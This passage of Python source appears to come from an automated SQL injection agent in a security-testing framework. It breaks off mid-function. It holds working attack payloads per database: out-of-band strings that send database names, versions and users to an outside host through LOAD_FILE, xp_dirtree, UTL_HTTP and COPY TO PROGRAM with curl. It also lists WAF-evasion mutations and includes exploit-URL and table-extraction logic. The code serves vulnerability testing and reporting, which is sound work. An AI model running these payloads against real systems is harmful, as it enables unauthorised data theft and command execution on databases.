"""
SQLiAgent v3 - INTELLIGENT SQL Injection Specialist

MAJOR IMPROVEMENTS (2026-01-23):
1. Confidence Hierarchy - Error/Union=CONFIRMED, Time-Based=PENDING
2. Parameter Prioritization - Test id, user_id, sort first
3. OOB SQLi with Interactsh - DNS exfiltration for blind SQLi
4. Filter Detection + Adaptive Mutation - Detect filtered chars, adapt payloads
5. Error Info Extraction - Extract tables/columns from errors
6. Triple Time-Based Verification - Baseline + short + long delay
7. JSON/API Body Injection - Test JSON POST bodies
8. Second-Order SQLi Detection - Inject in A, observe in B
9. Prepared Statement Detection - Early exit if parameterized
10. Full SQLMap Commands + Progressive Steps - Complete reproduction
11. No Time-Based by Default - technique=BEUS (no T)
12. LLM Exploitation Explanation - Professional description for triagers
"""

import asyncio
import re
import json
import time
import aiohttp
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Set
from urllib.parse import urlparse, parse_qs, urlencode, unquote
from dataclasses import dataclass, field
from loguru import logger

from bugtrace.agents.base import BaseAgent
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.tools.external import external_tools
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
)
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation
from bugtrace.core.verbose_events import create_emitter

# v2.1.0: Import specialist utilities for payload loading from JSON (if needed)
from bugtrace.agents.specialist_utils import load_full_payload_from_json, load_full_finding_data

# v3.2.0: Import TechContextMixin for context-aware SQLi detection
from bugtrace.agents.mixins.tech_context import TechContextMixin

# v3.4: ManipulatorOrchestrator for HTTP attack campaigns (L5 escalation)
from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy


# =============================================================================
# DATABASE FINGERPRINTS
# =============================================================================

DB_FINGERPRINTS = {
    "MySQL": [
        r"mysql", r"mariadb", r"You have an error in your SQL syntax",
        r"Warning.*mysql_", r"MySQLSyntaxErrorException", r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB)",
        r"MySqlClient\.", r"com\.mysql\.jdbc", r"Syntax error.*MySQL"
    ],
    "PostgreSQL": [
        r"postgresql", r"pg_", r"Npgsql\.", r"PG::SyntaxError",
        r"org\.postgresql", r"ERROR:\s*syntax error at or near",
        r"valid PostgreSQL result", r"unterminated quoted string at or near"
    ],
    "MSSQL": [
        r"microsoft.*sql.*server", r"mssql", r"Unclosed quotation mark",
        r"SqlException", r"Incorrect syntax near", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"Procedure.*expects parameter"
    ],
    "Oracle": [
        r"oracle", r"ORA-\d{5}", r"Oracle.*Driver", r"quoted string not properly terminated",
        r"oracle\.jdbc", r"SQL command not properly ended"
    ],
    "SQLite": [
        r"sqlite", r"SQLITE_ERROR", r"sqlite3\.OperationalError",
        r"unrecognized token", r"unable to open database file",
        r"near \".*\": syntax error"
    ]
}

TECHNIQUE_DESCRIPTIONS = {
    "error_based": "Error-based injection causes the database to reveal error messages containing query information.",
    "time_based": "Time-based blind injection infers data by measuring response delays (e.g., SLEEP commands).",
    "boolean_based": "Boolean-based blind injection infers data by observing different responses to true/false conditions.",
    "union_based": "UNION-based injection retrieves data by appending a UNION SELECT query.",
    "stacked": "Stacked queries injection executes multiple SQL statements in a single request.",
    "oob": "Out-of-Band injection exfiltrates data via DNS or HTTP requests to an external server."
}


@dataclass
class SQLiFinding:
    """
    Represents a confirmed SQL Injection finding with detailed reproduction data.
    """
    url: str
    parameter: str
    type: str = "SQLI"
    severity: str = "CRITICAL"
    
    # Core Classification
    injection_type: str = "unknown"  # UNION-based, boolean-blind, etc.
    technique: str = "unknown"       # Internal code (BEUSTQ)
    
    # Payload & Exploit
    working_payload: str = ""
    payload_encoded: str = ""
    exploit_url: str = ""
    exploit_url_encoded: str = ""
    
    # Evidence / Extraction
    columns_detected: Optional[int] = None
    column_detection_payload: Optional[str] = None
    extracted_databases: List[str] = field(default_factory=list)
    extracted_tables: List[str] = field(default_factory=list)
    sample_data: Optional[Dict] = None
    
    # Metadata
    dbms_detected: str = "unknown"
    sqlmap_command: str = ""
    sqlmap_output_summary: str = ""
    curl_command: str = ""
    sqlmap_reproduce_command: str = ""
    
    # Validation
    validated: bool = False
    evidence: Dict[str, Any] = field(default_factory=dict)
    reproduction_steps: List[str] = field(default_factory=list)
    status: str = "PENDING_VALIDATION"
    exploitation_explanation: str = ""


# =============================================================================
# PARAMETER PRIORITIZATION
# =============================================================================

HIGH_PRIORITY_SQLI_PARAMS = [
    # Numeric IDs (HIGHEST priority - most common SQLi vectors)
    "id", "user_id", "userid", "product_id", "productid", "item_id", "itemid",
    "order_id", "orderid", "category_id", "categoryid", "article_id", "post_id",
    "comment_id", "invoice_id", "account_id", "customer_id", "session_id",

    # Sorting/Pagination (ORDER BY injection)
    "sort", "order", "orderby", "sortby", "sort_by", "order_by",
    "limit", "offset", "page", "per_page", "pagesize",
    "dir", "direction", "asc", "desc",

    # Search/Filter (WHERE clause injection)
    "search", "q", "query", "filter", "keyword", "keywords", "term",
    "find", "lookup", "s", "w",

    # Selection/Column (dangerous - direct SQL manipulation)
    "select", "column", "columns", "field", "fields", "table", "col",

    # Auth-related (high value targets)
    "username", "user", "email", "login", "password", "pass", "pwd",
    "token", "auth", "key", "apikey",

    # File/Path (potential for LOAD_FILE)
    "file", "filename", "path", "filepath", "document", "doc",

    # Misc common
    "name", "title", "type", "status", "action", "mode", "view",
    "report", "data", "value", "val", "num", "no", "number",
]

MEDIUM_PRIORITY_PARAMS = [
    "date", "from", "to", "start", "end", "year", "month", "day",
    "price", "amount", "qty", "quantity", "size", "count",
    "lang", "language", "locale", "country", "region",
    "format", "output", "template", "theme", "style",
]


# =============================================================================
# OOB PAYLOADS (Per Database)
# =============================================================================

OOB_PAYLOADS = {
    "MySQL": [
        # DNS exfiltration via LOAD_FILE
        "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT database()), '.{oob_host}\\\\a'))-- ",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT @@version), '.{oob_host}\\\\a'))-- ",
        # HTTP via INTO OUTFILE (rare but possible)
        "' UNION SELECT 'test' INTO OUTFILE '//{oob_host}/share/test.txt'-- ",
    ],
    "MSSQL": [
        # xp_dirtree (most reliable)
        "'; EXEC master..xp_dirtree '//{oob_host}/sqli'-- ",
        "'; EXEC master.dbo.xp_dirtree '//{oob_host}/sqli'-- ",
        # xp_fileexist
        "'; EXEC master..xp_fileexist '//{oob_host}/sqli'-- ",
        # OPENROWSET
        "'; SELECT * FROM OPENROWSET('SQLOLEDB', 'server={oob_host}')-- ",
    ],
    "Oracle": [
        # UTL_HTTP (most common)
        "' AND UTL_HTTP.REQUEST('http://{oob_host}/'||(SELECT user FROM dual))='x'-- ",
        # UTL_INADDR
        "' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{oob_host}') FROM dual) IS NOT NULL-- ",
        # HTTPURITYPE
        "' AND (SELECT HTTPURITYPE('http://{oob_host}/'||(SELECT user FROM dual)).GETCLOB() FROM dual) IS NOT NULL-- ",
    ],
    "PostgreSQL": [
        # COPY TO PROGRAM (requires superuser)
        "'; COPY (SELECT '') TO PROGRAM 'curl http://{oob_host}/sqli'-- ",
        # dblink (if extension available)
        "'; SELECT dblink_connect('host={oob_host} dbname=test')-- ",
    ],
    "SQLite": [
        # SQLite doesn't have OOB capabilities
    ],
    "generic": [
        # Generic payloads that might work
        "' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- ",
    ]
}


# =============================================================================
# FILTER BYPASS MUTATIONS
# =============================================================================

FILTER_MUTATIONS = {
    "'": ["''", "\\'", "%27", "\\x27", "char(39)", "chr(39)"],
    '"': ['""', '\\"', "%22", "\\x22", "char(34)"],
    " ": ["/**/", "%20", "+", "%09", "%0a", "%0d", "/*comment*/"],
    "=": [" LIKE ", " REGEXP ", " RLIKE ", " IN (", " BETWEEN "],
    "OR": ["||", "oR", "Or", "OR/**/", "O/**/R"],
    "AND": ["&&", "aNd", "AnD", "AND/**/", "A/**/ND"],
    "UNION": ["UNI/**/ON", "UnIoN", "UNION/**/", "/*!UNION*/"],
    "SELECT": ["SEL/**/ECT", "SeLeCt", "SELECT/**/", "/*!SELECT*/"],
    "--": ["#", "/*", ";%00", "-- -"],
    "#": ["--", "/*", ";%00"],
}


# =============================================================================
# CONFIDENCE HIERARCHY
# =============================================================================

class SQLiConfidenceTier:
    """
    Confidence tiers for SQLi findings.

    TIER 3 (MAXIMUM): Data extracted, 100% confirmed
    TIER 2 (HIGH): Clear SQL error or behavior change
    TIER 1 (MEDIUM): Behavioral indication, needs verification
    TIER 0 (LOW): Anomaly detected, likely false positive
    """
    MAXIMUM = 3  # Union/Error with data, OOB callback received
    HIGH = 2     # Clear SQL error, boolean with >50% diff
    MEDIUM = 1   # Boolean with small diff, time-based triple verified
    LOW = 0      # Single time-based, anomaly without confirmation


# =============================================================================
# INFRASTRUCTURE COOKIE FILTER
# =============================================================================
# Load balancer, CDN, and WAF cookies that produce SQLi false positives.
# These cookies contain routing/session data that changes on every request,
# causing time-based and boolean-based SQLi checks to trigger incorrectly.
# Legitimate application cookies (session, TrackingId, etc.) are NOT filtered.

INFRASTRUCTURE_COOKIES = {
    # AWS Elastic Load Balancer
    "awsalb", "awsalbcors", "awsalbtg", "awsalbtgcors",
    # Cloudflare
    "__cfduid", "__cf_bm", "cf_clearance", "cf_chl_prog", "cf_chl_seq",
    # Akamai
    "rt", "aka_a2", "bm_sz", "bm_sv", "ak_bmsc",
    # Google Cloud Load Balancer
    "gclb",
    # Azure
    "arraffinity", "arraffinitysamesite",
    # Generic load balancers
    "_lb", "_lb_id", "lb-cookie", "serverid", "server-id",
}

# Prefixes that identify infrastructure cookies even if exact name varies
_INFRASTRUCTURE_COOKIE_PREFIXES = ("aws", "__cf", "aka_")


# =============================================================================
# SQLI AGENT V3
# =============================================================================

class SQLiAgent(BaseAgent, TechContextMixin):
    """
    Intelligent SQL Injection Specialist v3.

    Features:
    - Confidence-based validation hierarchy
    - Parameter prioritization
    - OOB detection with Interactsh
    - Filter detection and adaptive mutation
    - Error info extraction
    - Triple time-based verification
    - JSON/API body injection
    - Second-order SQLi detection
    - Prepared statement early exit
    - Complete SQLMap reproduction commands
    - LLM exploitation explanation
    - Context-aware technology stack integration (v3.2)
    """

    def __init__(self, url: str = None, param: str = None, event_bus: Any = None,
                 cookies: List[Dict] = None, headers: Dict[str, str] = None,
                 post_data: str = None, observation_points: List[str] = None,
                 report_dir: Path = None):
        super().__init__("SQLiAgent", "SQL Injection Specialist v3", event_bus=event_bus, agent_id="sqli_agent")
        self.url = url
        self.param = param
        self.cookies = cookies or []
        self.headers = headers or {}
        self.post_data = post_data
        self.observation_points = observation_points or []  # For second-order SQLi
        self.report_dir = report_dir  # v3.2: For context-aware tech stack loading

        self._tested_params = set()
        self._detected_db_type: Optional[str] = None
        self._detected_filters: Set[str] = set()
        self._baseline_response_time: float = 0
        self._baseline_content_length: int = 0
        self._max_impact_achieved = False
        self._interactsh = None

        # Statistics
        self._stats = {
            "params_tested": 0,
            "vulns_found": 0,
            "oob_callbacks": 0,
            "filters_detected": 0,
            "prepared_statement_exits": 0,
        }

        # Queue consumption mode (Phase 19)
        self._queue_mode = False  # True when consuming from queue
        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""
        self._stop_requested = False  # Flag to stop continuous loop

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # (param_type, param_name)

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        # v3.2: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._prime_directive: str = ""

    # =========================================================================
    # AUTO-VALIDATION: Override BaseAgent validation with SQLi-specific logic
    # =========================================================================

    def _validate_before_emit(self, finding: Dict) -> tuple[bool, str]:
        """
        SQLi-specific validation before emitting finding.

        Requirements for SQLi findings:
        1. Basic validation (type, url) from BaseAgent
        2. Must have evidence of SQL injection (error, time delay, or data extraction)
        3. Payload should look like SQL (not conversational)

        Args:
            finding: Finding dict to validate

        Returns:
            (is_valid, error_message) tuple
        """
        # Call parent validation first
        is_valid, error = super()._validate_before_emit(finding)
        if not is_valid:
            return False, error

        # SQLi-specific validation
        evidence = finding.get("evidence", {})

        # Check for proof of SQL injection
        has_error = evidence.get("error_message") or evidence.get("sql_error")
        has_time = evidence.get("time_delay") or evidence.get("time_based")
        has_data = evidence.get("data_extracted") or evidence.get("extracted_data")

        if not (has_error or has_time or has_data):
            return False, "SQLi requires proof: SQL error, time delay, or data extraction"

        # Payload sanity check (should have SQL syntax or SQL probe chars)
        payload = str(finding.get("payload", ""))
        # Error-based probes use quotes/parens to break SQL syntax - these are valid
        sql_probe_chars = ["'", '"', ")", "(", "\\"]
        sql_keywords = ['SELECT', 'UNION', 'AND', 'OR', 'SLEEP', 'WAITFOR', '--', '#', ';', 'WHERE']
        has_probe_char = any(c in payload for c in sql_probe_chars)
        has_keyword = any(kw in payload.upper() for kw in sql_keywords)
        if payload and not (has_probe_char or has_keyword):
            return False, f"SQLi payload missing SQL syntax: {payload[:50]}"

        # All checks passed
        return True, ""

    def _emit_sqli_finding(self, finding_dict: Dict, status: str = None, needs_cdp: bool = False):
        """
        Helper to emit SQLi finding using BaseAgent.emit_finding() with validation.

        Args:
            finding_dict: The nested 'finding' dict with type, url, parameter, payload, etc.
            status: Validation status
            needs_cdp: Whether finding needs CDP validation (usually False for SQLi)
        """
        from bugtrace.core.validation_status import ValidationStatus

        # Wrap in full event structure
        full_event = {
            "specialist": "sqli",
            "finding": finding_dict,
            "status": status or ValidationStatus.VALIDATED_CONFIRMED.value,
            "validation_requires_cdp": needs_cdp,
            "scan_context": getattr(self, '_scan_context', 'unknown'),
        }

        # Use BaseAgent.emit_finding() which validates before emitting
        result = self.emit_finding(finding_dict)

        if result:
            # Emit the full event structure for backward compatibility
            from bugtrace.core.event_bus import EventType
            from bugtrace.core.config import settings
            if settings.WORKER_POOL_EMIT_EVENTS:
                import asyncio
                asyncio.create_task(self.event_bus.emit(EventType.VULNERABILITY_DETECTED, full_event))

    def _finding_to_dict(self, finding: SQLiFinding) -> Dict:
        """Convert SQLiFinding object to dictionary for report."""
        return {
            "type": finding.type,
            "url": finding.url,
            "parameter": finding.parameter,
            "severity": finding.severity,  # Already uppercase CRITICAL
            "cwe_id": get_cwe_for_vuln("SQLI"),  # CWE-89
            "cve_id": "N/A",  # SQLi vulnerabilities are class-based, not specific CVEs
            "remediation": get_remediation_for_vuln("SQLI"),
            "injection_type": finding.injection_type,
            "working_payload": finding.working_payload,
            "payload": finding.working_payload, # Backwards compatibility
            "payload_encoded": finding.payload_encoded,
            "exploit_url": finding.exploit_url,
            "exploit_url_encoded": finding.exploit_url_encoded,
            "columns_detected": finding.columns_detected,
            "column_detection_payload": finding.column_detection_payload,
            "extracted_databases": finding.extracted_databases,
            "extracted_tables": finding.extracted_tables,
            "sample_data": finding.sample_data,
            "dbms_detected": finding.dbms_detected,
            "sqlmap_command": finding.sqlmap_command,
            "curl_command": finding.curl_command,
            "sqlmap_reproduce_command": finding.sqlmap_reproduce_command,
            "validated": finding.validated,
            "evidence": finding.evidence,
            "reproduction_steps": finding.reproduction_steps,
            "status": finding.status,
            "description": finding.exploitation_explanation or f"SQL Injection confirmed in parameter '{finding.parameter}'. Technique: {finding.injection_type}. Payload: {finding.working_payload}",
            "reproduction": "\n".join(finding.reproduction_steps),
            # HTTP evidence fields
            "http_request": finding.evidence.get("http_request", finding.curl_command),
            "http_response": finding.evidence.get("http_response", finding.evidence.get("raw_output", "")[:500] if finding.evidence.get("raw_output") else ""),
            "sqli_metadata": {
                "technique": finding.injection_type,
                "database_type": finding.dbms_detected,
                "detection_tool": "BugTrace SQLi Agent",
                "payload": finding.working_payload,
                "exploit_url": finding.exploit_url,
                "exploit_url_encoded": finding.exploit_url_encoded,
                "extracted_data": {
                    "tables": finding.extracted_tables,
                    "columns_count": finding.columns_detected,
                    "databases": finding.extracted_databases
                },
                "raw_evidence": str(finding.evidence)
            }
        }

    def _parse_sqlmap_output(self, output: str) -> Dict:
        """Parse raw SQLMap output for reporting details."""
        details = {
            "injection_type": "unknown",
            "working_payload": "",
            "dbms": "unknown",
            "databases": [],
            "tables": [],
            "columns_count": None
        }

        details["working_payload"] = self._extract_sqlmap_payload(output)
        details["injection_type"] = self._extract_sqlmap_type(output)
        details["dbms"] = self._extract_sqlmap_dbms(output)
        details["databases"] = self._extract_sqlmap_databases(output)
        details["tables"] = self._extract_sqlmap_tables(output)

        return details

    def _extract_sqlmap_payload(self, output: str) -> str:
        """Extract payload from SQLMap output."""
        payload_match = re.search(r"Payload: (.+)", output)
        return payload_match.group(1).strip() if payload_match else ""

    def _extract_sqlmap_type(self, output: str) -> str:
        """Extract injection type from SQLMap output."""
        type_match = re.search(r"Type: (.+)", output)
        return type_match.group(1).strip() if type_match else "unknown"

    def _extract_sqlmap_dbms(self, output: str) -> str:
        """Extract DBMS from SQLMap output."""
        dbms_match = re.search(r"back-end DBMS: (.+)", output)
        return dbms_match.group(1).strip() if dbms_match else "unknown"

    def _extract_sqlmap_databases(self, output: str) -> List[str]:
        """Extract databases from SQLMap output."""
        if "available databases" not in output:
            return []
        dbs = re.findall(r"\[\*\] (.+)", output)
        return [db for db in dbs if not db.startswith("ending") and " " not in db]

    def _extract_sqlmap_tables(self, output: str) -> List[str]:
        """Extract tables from SQLMap output."""
        if "Database:" not in output or "+" not in output:
            return []
        possible_tables = re.findall(r"\| (.+?) \|", output)
        return [t.strip() for t in possible_tables if t.strip() != "table_name"]

    def _build_exploit_url(self, url: str, param: str, payload: str) -> Tuple[str, str]:
        """Build raw and encoded exploit URLs."""
        if not payload:
            return url, url
            
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        # Raw URL (may not be valid link but readable)
        query_raw = urlencode(params, doseq=True, quote_via=lambda x,y,z,w: x) # Hack to not quote? No, urlencode always quotes.
        # Let's manually reconstruct for raw
        # Actually, for the report "Exploit URL", we want the encoded functional one usually.
        # But "Raw" might mean readable payload.
        
        # Fully encoded (Working link)
        query_encoded = urlencode(params, doseq=True)
        
        exploit_url_encoded = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_encoded}"
        
        # Semi-raw for display (payload unencoded)
        # We replace the param value in the original query or reconstruct
        # Simple reconstruction:
        params_raw = parse_qs(parsed.query)
        params_raw[param] = [payload]
        # We can't really build a valid URL with raw spaces easily without custom logic
        # Just return the encoded one as primary, and maybe a "decoded" version for display
        
        return exploit_url_encoded, exploit_url_encoded # For now use encoded for both to be safe links

    def _generate_repro_steps(self, url: str, param: str, payload: str, curl_cmd: str) -> List[str]:
        """Generate step-by-step reproduction instructions."""
        return [
            f"1. Navigate to the target: {url}",
            f"2. Locate the parameter `{param}`",
            f"3. Inject the following payload: `{payload}`",
            f"4. Expected observation: Database query execution or error",
            f"5. Alternative: Run the provided cURL command:",
            f"   `{curl_cmd}`"
        ]

    # =========================================================================
    # CONFIDENCE HIERARCHY
    # =========================================================================

    def _get_confidence_tier(self, technique: str, evidence: Dict) -> int:
        """
        Determine confidence tier based on technique and evidence.

        Returns:
            3 = MAXIMUM (data extracted, OOB confirmed)
            2 = HIGH (clear SQL error, strong boolean diff)
            1 = MEDIUM (verified time-based, weak boolean)
            0 = LOW (unverified, likely FP)
        """
        # TIER 3: Maximum confidence
        if evidence.get("data_extracted"):
            return SQLiConfidenceTier.MAXIMUM
        if evidence.get("oob_callback_received"):
            return SQLiConfidenceTier.MAXIMUM
        if technique == "union_based" and evidence.get("columns_found"):
            return SQLiConfidenceTier.MAXIMUM
        if technique == "error_based" and evidence.get("tables_leaked"):
            return SQLiConfidenceTier.MAXIMUM

        # TIER 2: High confidence
        if technique == "error_based" and evidence.get("sql_error_visible"):
            return SQLiConfidenceTier.HIGH
        if technique == "boolean_based" and evidence.get("diff_ratio", 0) > 0.5:
            return SQLiConfidenceTier.HIGH
        if technique == "stacked" and evidence.get("execution_confirmed"):
            return SQLiConfidenceTier.HIGH

        # TIER 1: Medium confidence (needs verification)
        if technique == "time_based" and evidence.get("triple_verified"):
            return SQLiConfidenceTier.MEDIUM
        if technique == "boolean_based" and evidence.get("diff_ratio", 0) > 0.2:
            return SQLiConfidenceTier.MEDIUM

        # TIER 0: Low confidence
        return SQLiConfidenceTier.LOW

    def _determine_validation_status(self, technique: str, evidence: Dict) -> str:
        """
        Determine validation status based on confidence tier.

        TIER 3, 2 → VALIDATED_CONFIRMED
        TIER 1 → PENDING_VALIDATION
        TIER 0 → POTENTIAL_SQLI (not reported as finding)
        """
        tier = self._get_confidence_tier(technique, evidence)

        if tier >= SQLiConfidenceTier.HIGH:
            logger.info(f"[{self.name}] Confidence Tier {tier}: VALIDATED_CONFIRMED")
            return "VALIDATED_CONFIRMED"
        elif tier >= SQLiConfidenceTier.MEDIUM:
            logger.info(f"[{self.name}] Confidence Tier {tier}: PENDING_VALIDATION")
            return "PENDING_VALIDATION"
        else:
            logger.info(f"[{self.name}] Confidence Tier {tier}: LOW (not reporting)")
            return "POTENTIAL_SQLI"

    def _should_stop_testing(self, technique: str, evidence: Dict, findings_count: int) -> Tuple[bool, str]:
        """Determine if we should stop based on confidence achieved."""
        tier = self._get_confidence_tier(technique, evidence)

        if tier >= SQLiConfidenceTier.MAXIMUM:
            self._max_impact_achieved = True
            return True, "🏆 MAXIMUM CONFIDENCE: Data extracted or OOB confirmed"

        if tier >= SQLiConfidenceTier.HIGH and findings_count >= 1:
            return True, "✅ HIGH CONFIDENCE: SQL error confirmed"

        if findings_count >= 2:
            return True, "⚡ 2 findings found, moving on"

        return False, ""

    # =========================================================================
    # PARAMETER PRIORITIZATION
    # =========================================================================

    def _prioritize_params(self, params: List[str]) -> List[str]:
        """
        Prioritize parameters by likelihood of SQLi vulnerability.

        Order: High priority → Medium priority → Others
        """
        high = []
        medium = []
        low = []

        for param in params:
            param_lower = param.lower()

            # Check high priority
            is_high = any(
                hp == param_lower or hp in param_lower or param_lower in hp
                for hp in HIGH_PRIORITY_SQLI_PARAMS
            )

            # Check medium priority
            is_medium = any(
                mp == param_lower or mp in param_lower
                for mp in MEDIUM_PRIORITY_PARAMS
            )

            if is_high:
                high.append(param)
            elif is_medium:
                medium.append(param)
            else:
                low.append(param)

        if high:
            logger.info(f"[{self.name}] 🎯 High-priority params: {high[:5]}")

        return high + medium + low

    # =========================================================================
    # FILTER DETECTION & ADAPTIVE MUTATION
    # =========================================================================

    async def _detect_filtered_chars(self, session: aiohttp.ClientSession, param: str) -> Set[str]:
        """
        Detect which characters/keywords are filtered by the WAF/application.
        """
        filtered = set()
        test_chars = ["'", '"', "--", "#", "/*", " ", "=", "OR", "AND", "UNION", "SELECT"]

        base_url = self._get_base_url()

        for char in test_chars:
            if await self._is_char_filtered(session, base_url, param, char):
                filtered.add(char)

        if filtered:
            self._detected_filters = filtered
            self._stats["filters_detected"] = len(filtered)
            logger.info(f"[{self.name}] 🛡️ Filtered chars detected: {filtered}")
            if hasattr(self, '_v'):
                self._v.emit("exploit.sqli.filters_detected", {
                    "param": param,
                    "filtered": list(filtered),
                    "count": len(filtered),
                })

        return filtered

    async def _is_char_filtered(self, session: aiohttp.ClientSession, base_url: str,
                                param: str, char: str) -> bool:
        """Check if a single character is filtered."""
        try:
            test_value = f"test{char}test"
            test_url = self._build_url_with_param(base_url, param, test_value)

            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                # Check for WAF block indicators
                if resp.status in [403, 406, 429, 503]:
                    return True

                content = await resp.text()
                return self._has_block_indicators(content)
        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return False

    def _has_block_indicators(self, content: str) -> bool:
        """Check if response content contains WAF block indicators."""
        block_indicators = [
            "blocked", "forbidden", "not allowed", "waf", "firewall",
            "security", "illegal", "invalid character", "attack detected"
        ]
        return any(ind in content.lower() for ind in block_indicators)

    def _mutate_payload_for_filters(self, payload: str) -> List[str]:
        """
        Generate payload variants that bypass detected filters.
        """
        if not self._detected_filters:
            return [payload]

        variants = [payload]

        for filtered_char in self._detected_filters:
            self._add_mutations_for_char(variants, payload, filtered_char)

        return variants[:10]  # Limit to 10 variants

    def _add_mutations_for_char(self, variants: List[str], payload: str, filtered_char: str):
        """Add mutations for a filtered character to variants list."""
        if filtered_char not in FILTER_MUTATIONS:
            return

        for mutation in FILTER_MUTATIONS[filtered_char]:
            new_variant = payload.replace(filtered_char, mutation)
            if new_variant not in variants:
                variants.append(new_variant)

    # =========================================================================
    # ERROR INFO EXTRACTION
    # =========================================================================

    def _extract_info_from_error(self, error_response: str) -> Dict:
        """
        Extract useful information from SQL error messages.
        """
        info = {
            "tables_leaked": [],
            "columns_leaked": [],
            "server_paths": [],
            "db_version": None,
            "db_type": None,
        }

        if not error_response:
            return info

        info["tables_leaked"] = self._extract_tables_from_error(error_response)
        info["columns_leaked"] = self._extract_columns_from_error(error_response)
        info["server_paths"] = self._extract_paths_from_error(error_response)
        info["db_type"], info["db_version"] = self._extract_db_version(error_response)

        if not info["db_type"]:
            info["db_type"] = self._detect_database_type(error_response)

        return info

    def _extract_tables_from_error(self, error_response: str) -> List[str]:
        """Extract table names from error message."""
        table_patterns = [
            r"table ['\"`]?(\w+)['\"`]?",
            r"FROM ['\"`]?(\w+)['\"`]?",
            r"INTO ['\"`]?(\w+)['\"`]?",
            r"UPDATE ['\"`]?(\w+)['\"`]?",
        ]
        tables = []
        for pattern in table_patterns:
            matches = re.findall(pattern, error_response, re.IGNORECASE)
            tables.extend(matches)
        return list(set(tables))

    def _extract_columns_from_error(self, error_response: str) -> List[str]:
        """Extract column names from error message."""
        column_patterns = [
            r"column ['\"`]?(\w+)['\"`]?",
            r"Unknown column ['\"`]?(\w+)['\"`]?",
            r"field ['\"`]?(\w+)['\"`]?",
        ]
        columns = []
        for pattern in column_patterns:
            matches = re.findall(pattern, error_response, re.IGNORECASE)
            columns.extend(matches)
        return list(set(columns))

    def _extract_paths_from_error(self, error_response: str) -> List[str]:
        """Extract server paths from error message."""
        path_patterns = [
            r"(/[\w/.-]+\.php)",
            r"(/var/www/[\w/.-]+)",
            r"(C:\\[\w\\.-]+)",
            r"(/home/[\w/.-]+)",
        ]
        paths = []
        for pattern in path_patterns:
            matches = re.findall(pattern, error_response)
            paths.extend(matches)
        return list(set(paths))

    def _extract_db_version(self, error_response: str) -> Tuple[Optional[str], Optional[str]]:
        """Extract database type and version from error message."""
        version_patterns = [
            r"(MySQL|MariaDB)[\s/]*([\d.]+)",
            r"(PostgreSQL)[\s/]*([\d.]+)",
            r"(Microsoft SQL Server)[\s/]*([\d.]+)",
            r"(Oracle)[\s/]*([\d.]+)",
            r"(SQLite)[\s/]*([\d.]+)",
        ]
        for pattern in version_patterns:
            match = re.search(pattern, error_response, re.IGNORECASE)
            if match:
                return match.group(1), f"{match.group(1)} {match.group(2)}"
        return None, None

    def _detect_database_type(self, response_text: str) -> Optional[str]:
        """Fingerprint database type from error messages."""
        if not response_text:
            return None

        for db_name, patterns in DB_FINGERPRINTS.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return db_name
        return None

    # =========================================================================
    # OOB (OUT-OF-BAND) SQLi WITH INTERACTSH
    # =========================================================================

    async def _init_interactsh(self):
        """Initialize Interactsh client for OOB detection."""
        try:
            from bugtrace.tools.interactsh_client import InteractshClient
            self._interactsh = InteractshClient()
            await self._interactsh.register()
            logger.info(f"[{self.name}] Interactsh initialized for OOB SQLi")
        except Exception as e:
            logger.warning(f"[{self.name}] Interactsh init failed: {e}")
            self._interactsh = None

    async def _test_oob_sqli(self, session: aiohttp.ClientSession, param: str) -> Optional[Dict]:
        """
        Test for OOB (Out-of-Band) SQL injection using DNS exfiltration.
        """
        if not self._interactsh:
            return None

        db_type = self._detected_db_type or "generic"
        payloads = OOB_PAYLOADS.get(db_type, OOB_PAYLOADS["generic"])

        if not payloads:
            return None

        oob_host = self._interactsh.get_payload_url("sqli", param)
        base_url = self._get_base_url()

        for payload_template in payloads:
            payload = payload_template.format(oob_host=oob_host)
            payload_variants = self._mutate_payload_for_filters(payload)

            for variant in payload_variants:
                finding = await self._test_oob_variant(session, base_url, param, variant, db_type)
                if finding:
                    return finding

        return None

    async def _test_oob_variant(self, session: aiohttp.ClientSession, base_url: str,
                                param: str, variant: str, db_type: str) -> Optional[SQLiFinding]:
        """Test a single OOB payload variant."""
        try:
            if hasattr(self, '_v'):
                self._v.emit("exploit.sqli.oob.sent", {
                    "param": param,
                    "db_type": db_type,
                    "payload_preview": variant[:80],
                })

            test_url = self._build_url_with_param(base_url, param, f"1{variant}")

            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.text()

            await asyncio.sleep(2)

            interactions = await self._interactsh.poll()
            if not interactions:
                return None

            return self._check_oob_interactions(interactions, param, variant, db_type)
        except Exception as e:
            logger.debug(f"OOB test failed: {e}")
            return None

    def _check_oob_interactions(self, interactions: List[Dict], param: str,
                                variant: str, db_type: str) -> Optional[SQLiFinding]:
        """Check OOB interactions for SQLi evidence."""
        for interaction in interactions:
            if "sqli" in interaction.get("full-id", ""):
                return self._create_oob_finding(param, variant, db_type, interaction)
        return None

    def _create_oob_finding(self, param: str, variant: str, db_type: str, interaction: Dict) -> SQLiFinding:
